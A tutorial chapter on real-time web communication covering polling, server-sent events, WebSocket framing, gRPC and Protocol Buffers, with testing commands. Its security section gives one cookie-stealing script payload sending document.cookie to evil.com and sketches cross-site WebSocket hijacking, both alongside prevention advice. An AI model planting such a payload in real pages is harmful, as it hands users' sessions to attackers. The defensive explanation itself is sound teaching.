# WebSockets, gRPC, and Real-Time Communication

> HTTP's request-response model works for most web interactions, but some applications need persistent, bidirectional communication — chat apps, live dashboards, multiplayer games, microservice streaming. WebSockets and gRPC solve this in fundamentally different ways.

---

## Table of Contents

1. [Beyond Request-Response](#beyond-request-response)
2. [Polling and Long Polling](#polling)
3. [Server-Sent Events (SSE)](#sse)
4. [WebSockets](#websockets)
5. [WebSocket Protocol Deep Dive](#ws-protocol)
6. [WebSocket Security](#ws-security)
7. [gRPC Overview](#grpc-overview)
8. [Protocol Buffers (Protobuf)](#protobuf)
9. [gRPC Communication Patterns](#grpc-patterns)
10. [gRPC vs REST vs WebSocket](#comparison)
11. [Linux: Testing Real-Time Protocols](#linux-testing)
12. [Key Takeaways](#key-takeaways)

---

## Beyond Request-Response

Standard HTTP is client-initiated, request-response:

```
Client: "Give me the latest price"    → Server: "It's $42"
Client: "Give me the latest price"    → Server: "It's $43"
Client: "Give me the latest price"    → Server: "It's $43"  (wasted request)
Client: "Give me the latest price"    → Server: "It's $44"
```

Problems with this approach for real-time data:

| Problem | Description |
|---------|-------------|
| **Latency** | Client discovers changes only when it asks |
| **Waste** | Many requests return unchanged data |
| **Overhead** | Each request carries full HTTP headers (~800 bytes) |
| **Server can't initiate** | Server has data but must wait for client to ask |

### The spectrum of real-time approaches

```
Periodic polling ─── Long polling ─── SSE ─── WebSocket ─── gRPC streaming
Less real-time                                                More real-time
More overhead                                                Less overhead
Simpler                                                      More complex
```

---

## Polling and Long Polling

### Short polling

Client repeatedly asks at fixed intervals:

```
Client: GET /api/messages          → 200 [] (no new messages)
(wait 2 seconds)
Client: GET /api/messages?since=t1 → 200 [] (still nothing)
(wait 2 seconds)
Client: GET /api/messages?since=t1 → 200 [{msg}] (got one!)
(wait 2 seconds)
Client: GET /api/messages?since=t2 → 200 [] (nothing again)
```

Problems:
- Delay = up to polling interval (2s) after message arrives
- Wastes bandwidth: Most responses are empty
- Server load: N clients × (60/interval) requests per minute per client
- 1000 clients polling every 2s = 30,000 requests/minute for mostly empty responses

### Long polling

Client sends request, server holds it until data is available:

```
Client: GET /api/messages (hangs, waiting...)
  (30 seconds pass, server has nothing)
Server: 200 [] (timeout, empty response)
Client: GET /api/messages (immediately reconnects, hangs again...)
  (5 seconds pass)
Server: 200 [{msg:"hello"}] (data available! respond immediately)
Client: GET /api/messages (immediately reconnects...)
```

Better than short polling (lower latency, fewer empty responses), but:
- Connection held open → server resource usage
- HTTP overhead on each reconnection
- Complex timeout management
- Not truly bidirectional

---

## SSE

Server-Sent Events: server pushes events over a long-lived HTTP connection.

```
Client: GET /api/stream
        Accept: text/event-stream

Server: HTTP/1.1 200 OK
        Content-Type: text/event-stream
        Cache-Control: no-cache
        Connection: keep-alive

        data: {"price": 42.50}

        data: {"price": 42.75}

        event: alert
        data: {"message": "Price spike!"}

        id: 12345
        data: {"price": 43.00}
        retry: 3000
```

### SSE format

```
Each event is separated by a blank line (\n\n)

Fields:
  data:   The payload (can be multi-line with multiple data: lines)
  event:  Event type (client can listen for specific types)
  id:     Event ID (for reconnection — client sends Last-Event-ID header)
  retry:  Milliseconds before client should retry on disconnect
```

### Strengths and limitations

| Strengths | Limitations |
|-----------|-------------|
| Simple — just HTTP GET | Server → Client only (unidirectional) |
| Auto-reconnection built in | Text only (no binary) |
| Works through proxies/firewalls | Max 6 connections per domain (HTTP/1.1) |
| Event ID for resume after disconnect | No flow control (just TCP flow control) |
| No special server infrastructure | |

SSE is ideal for: Live feeds, notifications, dashboards — where server pushes updates and client just listens.

---

## WebSockets

WebSocket (RFC 6455) provides full-duplex, bidirectional communication over a single TCP connection.

### How WebSocket works

```
1. HTTP Upgrade handshake (one-time):
   Client: GET /chat HTTP/1.1
           Upgrade: websocket
           Connection: Upgrade
           Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
           Sec-WebSocket-Version: 13

   Server: HTTP/1.1 101 Switching Protocols
           Upgrade: websocket
           Connection: Upgrade
           Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=

2. After handshake, HTTP is GONE.
   The TCP connection now speaks WebSocket protocol.
   Both sides can send messages at any time.

3. Connection stays open until either side closes it.
```

### Upgrade handshake details

```
Sec-WebSocket-Key: Client sends random base64 value
Sec-WebSocket-Accept: Server proves it understood the request:
  accept = base64(SHA-1(key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"))

This magic GUID prevents non-WebSocket servers from accidentally accepting.
```

### Why use port 80/443?

WebSocket reuses HTTP ports and starts as an HTTP request. This means:
- Works through firewalls that allow HTTP
- Works through HTTP proxies (with caveats)
- No firewall configuration needed
- TLS via `wss://` (WebSocket Secure) on port 443

---

## WebSocket Protocol

### Frame format

After the HTTP upgrade, all communication uses WebSocket frames:

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-------+-+-------------+-------------------------------+
|F|R|R|R| Opcode|M| Payload len |    Extended payload length    |
|I|S|S|S|  (4)  |A|     (7)     |          (16/64 bits)         |
|N|V|V|V|       |S|             |                               |
| |1|2|3|       |K|             |                               |
+-+-+-+-+-------+-+-------------+-------------------------------+
|     Masking key (if MASK=1)   |                               |
+-------------------------------+-------------------------------+
|                    Payload Data                               |
+---------------------------------------------------------------+
```

| Field | Size | Purpose |
|-------|------|---------|
| FIN | 1 bit | 1 = final fragment of message |
| Opcode | 4 bits | Frame type (text=1, binary=2, close=8, ping=9, pong=A) |
| MASK | 1 bit | 1 = payload is masked (MUST be 1 from client→server) |
| Payload length | 7/16/64 bits | 0-125 directly; 126 = 16-bit follows; 127 = 64-bit follows |
| Masking key | 32 bits | XOR mask for payload (only client→server) |
| Payload | variable | The actual message data |

### Masking — why does the client mask data?

Client-to-server frames MUST be masked. This is a security measure against **cache poisoning attacks**:

```
Without masking:
  Attacker controls a "WebSocket" client
  Sends crafted binary data that looks like HTTP response
  Transparent proxy caches it as if it were an HTTP response
  Other users GET the poisoned cached response

With masking:
  Random 32-bit key XORs the payload
  Proxy sees random-looking bytes, can't interpret as HTTP
  Attack fails
```

Server-to-client frames are NOT masked (server is trusted).

### Control frames

```
Ping/Pong (heartbeat):
  Client or Server: PING (opcode 0x9)
  Other side MUST respond: PONG (opcode 0xA)
  Used to detect dead connections
  
Close (opcode 0x8):
  Either side sends: CLOSE frame with status code
  Other side responds: CLOSE frame
  TCP connection torn down

Status codes:
  1000: Normal closure
  1001: Going away (page navigation, server shutdown)
  1002: Protocol error
  1003: Unsupported data type
  1006: Abnormal closure (no close frame received)
  1008: Policy violation
  1011: Server error
```

### Message fragmentation

Large messages can be split into multiple frames:

```
Frame 1: FIN=0, opcode=0x1 (text), payload="Hello "
Frame 2: FIN=0, opcode=0x0 (continuation), payload="World"
Frame 3: FIN=1, opcode=0x0 (continuation), payload="!"

Reassembled message: "Hello World!"
```

---

## WebSocket Security

### Common vulnerabilities

**1. Cross-Site WebSocket Hijacking (CSWSH)**

```
Attacker's page (evil.com):
  new WebSocket("wss://bank.com/ws")
  
  Browser sends cookies for bank.com automatically!
  WebSocket connection is authenticated with victim's session!
  
Prevention:
  - Check Origin header on server
  - Use authentication tokens (not cookies) in WebSocket messages
  - CSRF tokens during upgrade handshake
```

**2. Injection attacks**

```
WebSocket doesn't escape data. If you display received messages as HTML:
  Attacker sends: <script>document.location='evil.com?c='+document.cookie</script>
  
Prevention:
  - Always sanitize/escape data before rendering
  - Use textContent, not innerHTML
  - Validate message format server-side
```

**3. Denial of service**

```
WebSocket connections are persistent — each consumes server resources.
Attacker opens thousands of connections → server runs out of memory/file descriptors.

Prevention:
  - Rate limit new connections per IP
  - Set maximum connections per user
  - Implement idle timeout (close inactive connections)
  - Use reverse proxy (nginx) to limit concurrent WebSocket connections
```

### Best practices

```
1. Always use wss:// (WebSocket over TLS), never ws:// in production
2. Validate Origin header to prevent CSWSH
3. Authenticate via token in first message, not cookies
4. Implement heartbeat (ping/pong) to detect dead connections
5. Set maximum message size to prevent memory exhaustion
6. Rate limit messages per connection
7. Validate and sanitize all received data
```

---

## gRPC Overview

gRPC (Google Remote Procedure Call) is a high-performance RPC framework built on HTTP/2 and Protocol Buffers.

### What is RPC?

```
REST (resource-oriented):
  GET    /api/users/42           → get user
  POST   /api/users              → create user
  PUT    /api/users/42           → update user
  DELETE /api/users/42           → delete user

RPC (action-oriented):
  GetUser(id=42)                 → get user
  CreateUser(name="Alice")       → create user
  UpdateUser(id=42, name="Bob")  → update user
  DeleteUser(id=42)              → delete user
```

Think of RPC as calling a function on a remote server as if it were local.

### Why gRPC exists

```
Problem: Microservices need to communicate. REST+JSON has overhead:
  - JSON parsing is slow (text → structured data)
  - JSON is verbose ("id": 42 → 8 bytes, vs 1-2 bytes in binary)
  - No schema enforcement (field misspelling causes silent bugs)
  - HTTP/1.1 overhead (headers, no multiplexing)
  - Code generation requires separate tools (OpenAPI/Swagger)

gRPC solution:
  - Protocol Buffers (binary, compact, schema-enforced)
  - HTTP/2 (multiplexing, streaming)
  - Code generation from .proto files (type-safe clients/servers)
  - Bidirectional streaming built-in
  - Deadline propagation, cancellation
```

---

## Protocol Buffers

### Defining a service

```protobuf
// user.proto
syntax = "proto3";

package user;

// Service definition
service UserService {
  rpc GetUser(GetUserRequest) returns (User);
  rpc CreateUser(CreateUserRequest) returns (User);
  rpc ListUsers(ListUsersRequest) returns (stream User);        // server streaming
  rpc Chat(stream ChatMessage) returns (stream ChatMessage);    // bidirectional
}

// Message definitions
message GetUserRequest {
  int32 id = 1;           // field number, not default value
}

message CreateUserRequest {
  string name = 1;
  string email = 2;
  int32 age = 3;
}

message User {
  int32 id = 1;
  string name = 2;
  string email = 3;
  int32 age = 4;
  repeated string roles = 5;    // list/array
}

message ListUsersRequest {
  int32 page_size = 1;
  string page_token = 2;
}

message ChatMessage {
  string user = 1;
  string text = 2;
  int64 timestamp = 3;
}
```

### Binary encoding — why it's fast

```
JSON:  {"id": 42, "name": "Alice", "email": "alice@example.com", "age": 30}
       = 65 bytes (text, keys repeated in every message)

Protobuf: 08 2a 12 05 41 6c 69 63 65 1a 11 ... 20 1e
          = ~30 bytes (binary, field numbers instead of names)

Field encoding:
  Field 1 (id), varint, value 42:   08 2a         (2 bytes)
  Field 2 (name), string "Alice":   12 05 41...   (7 bytes)
  
  Each field: (field_number << 3) | wire_type
  Wire types: 0=varint, 1=64-bit, 2=length-delimited, 5=32-bit
```

---

## gRPC Patterns

### 1. Unary RPC (request-response)

```
Client ──── GetUser(id=42) ────→ Server
Client ←──── User{...} ────── Server

Like regular HTTP request-response, but binary + typed.
```

### 2. Server streaming

```
Client ──── ListUsers(page_size=100) ────→ Server
Client ←──── User{id:1} ──────────────── Server
Client ←──── User{id:2} ──────────────── Server
Client ←──── User{id:3} ──────────────── Server
...
Client ←──── (end of stream) ─────────── Server

Server sends multiple messages. Client reads until stream ends.
Use case: Large result sets, real-time feeds, log tailing.
```

### 3. Client streaming

```
Client ──── UploadChunk{data:...} ────→ Server
Client ──── UploadChunk{data:...} ────→ Server
Client ──── UploadChunk{data:...} ────→ Server
Client ──── (end of stream) ──────────→ Server
Client ←──── UploadResult{...} ────── Server

Client sends multiple messages. Server responds once at the end.
Use case: File upload, batch data ingestion, telemetry.
```

### 4. Bidirectional streaming

```
Client ──── ChatMsg{"hello"} ──────→ Server
Client ←──── ChatMsg{"hi!"} ────── Server
Client ──── ChatMsg{"how are you?"} → Server
Client ←──── ChatMsg{"good!"} ──── Server
Client ──── ChatMsg{"bye"} ────────→ Server

Both sides send messages independently on the same connection.
Use case: Chat, multiplayer games, collaborative editing.
```

### gRPC over HTTP/2

```
gRPC maps to HTTP/2:
  - Each RPC call = one HTTP/2 stream
  - Request: POST /package.Service/Method
  - Headers: content-type: application/grpc
  - Body: length-prefixed protobuf messages
  - Trailers: grpc-status, grpc-message (error info)

Example HTTP/2 frames for GetUser(id=42):
  HEADERS: :method=POST, :path=/user.UserService/GetUser
           content-type: application/grpc
  DATA:    [5 bytes header][protobuf bytes]
           Header: compressed? (1 byte) + length (4 bytes)
```

### Deadlines and cancellation

```
gRPC propagates deadlines across service boundaries:

Client → Service A → Service B → Service C
         deadline=5s

If Service B takes 4s:
  Service C gets only 1s remaining
  If Service C can't finish in 1s → DEADLINE_EXCEEDED
  Cancellation propagates back → all services stop work

This prevents cascading timeouts in microservice architectures.
```

---

## Comparison

| Feature | REST (HTTP/1.1) | WebSocket | gRPC |
|---------|----------------|-----------|------|
| Transport | HTTP/1.1 or 2 | TCP (after HTTP upgrade) | HTTP/2 |
| Format | JSON (text) | Any (text/binary) | Protobuf (binary) |
| Direction | Request-response | Bidirectional | All 4 patterns |
| Schema | Optional (OpenAPI) | None | Required (.proto) |
| Browser support | Native | Native | Via grpc-web proxy |
| Streaming | SSE only | Yes | Yes (4 patterns) |
| Code generation | Optional | No | Built-in |
| Human readable | Yes | Depends | No (binary) |
| Performance | Moderate | Good | Excellent |
| Use case | Public APIs | Real-time web apps | Microservices |

### When to use what

```
REST:
  ✓ Public APIs (human-readable, well-understood)
  ✓ CRUD operations
  ✓ Browser clients
  ✓ Caching needed (HTTP caching works great)

WebSocket:
  ✓ Real-time browser apps (chat, games, live data)
  ✓ Bidirectional browser-server communication
  ✓ When you need server-to-client push in browser

gRPC:
  ✓ Microservice-to-microservice communication
  ✓ High-performance inter-service calls
  ✓ Polyglot environments (generate clients in any language)
  ✓ Streaming data between services

SSE:
  ✓ Simple server→client push (notifications, feeds)
  ✓ When you don't need client→server streaming
  ✓ When simplicity matters more than features
```

---

## Linux: Testing Real-Time Protocols

### WebSocket testing with websocat

```bash
# Install websocat
# From releases: https://github.com/vi/websocat/releases
# Or: cargo install websocat

# Connect to WebSocket server
websocat ws://echo.websocket.org

# Connect to secure WebSocket
websocat wss://echo.websocket.org

# Send and receive (text)
echo "Hello, WebSocket!" | websocat ws://echo.websocket.org

# Interactive mode — type messages, see responses
websocat -t ws://localhost:8080/ws
```

### WebSocket with curl (v7.86+)

```bash
# curl supports WebSocket since 7.86
curl --include \
     --no-buffer \
     --header "Connection: Upgrade" \
     --header "Upgrade: websocket" \
     --header "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
     --header "Sec-WebSocket-Version: 13" \
     http://localhost:8080/ws
```

### gRPC testing with grpcurl

```bash
# Install
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
# Or: brew install grpcurl

# List services (requires server reflection enabled)
grpcurl -plaintext localhost:50051 list

# List methods of a service
grpcurl -plaintext localhost:50051 list user.UserService

# Describe a method
grpcurl -plaintext localhost:50051 describe user.UserService.GetUser

# Call unary RPC
grpcurl -plaintext -d '{"id": 42}' localhost:50051 user.UserService/GetUser

# Server streaming
grpcurl -plaintext -d '{"page_size": 10}' localhost:50051 user.UserService/ListUsers
```

### Observing WebSocket traffic with tcpdump

```bash
# Capture WebSocket upgrade
sudo tcpdump -i lo -A 'tcp port 8080' | grep -A5 "Upgrade: websocket"

# For encrypted (wss://), use SSLKEYLOGFILE + Wireshark
SSLKEYLOGFILE=/tmp/keys.log node client.js
# In Wireshark: Edit → Preferences → TLS → Pre-Master-Secret log → /tmp/keys.log
# Filter: websocket
```

### Simple WebSocket server (Python, for testing)

```python
#!/usr/bin/env python3
# pip install websockets
import asyncio
import websockets

async def echo(websocket):
    async for message in websocket:
        print(f"Received: {message}")
        await websocket.send(f"Echo: {message}")

async def main():
    async with websockets.serve(echo, "localhost", 8765):
        print("WebSocket server on ws://localhost:8765")
        await asyncio.Future()  # run forever

asyncio.run(main())
```

---

## Key Takeaways

1. **Short polling wastes bandwidth** — most responses are empty; use only for simple, infrequent checks
2. **Long polling is better** but still has per-request HTTP overhead and isn't truly bidirectional
3. **SSE is ideal for server→client push** — simple, built on HTTP, auto-reconnection, but unidirectional
4. **WebSocket = full duplex** — starts as HTTP upgrade, then switches to its own binary frame protocol
5. **WebSocket security**: Validate Origin header, don't rely on cookies, sanitize all data
6. **gRPC = RPC over HTTP/2** with Protocol Buffers — compact binary, schema-enforced, streaming
7. **Protocol Buffers** are 2-5× smaller than JSON and 10-100× faster to parse
8. **gRPC has four patterns**: unary, server streaming, client streaming, bidirectional streaming
9. **Deadlines propagate** in gRPC — prevents cascading timeouts in microservice chains
10. **Choose by use case**: REST for public APIs, WebSocket for real-time browser apps, gRPC for microservices, SSE for simple push

---

## Next

→ [04-email-smtp-imap.md](04-email-smtp-imap.md) — The original internet application: email protocols
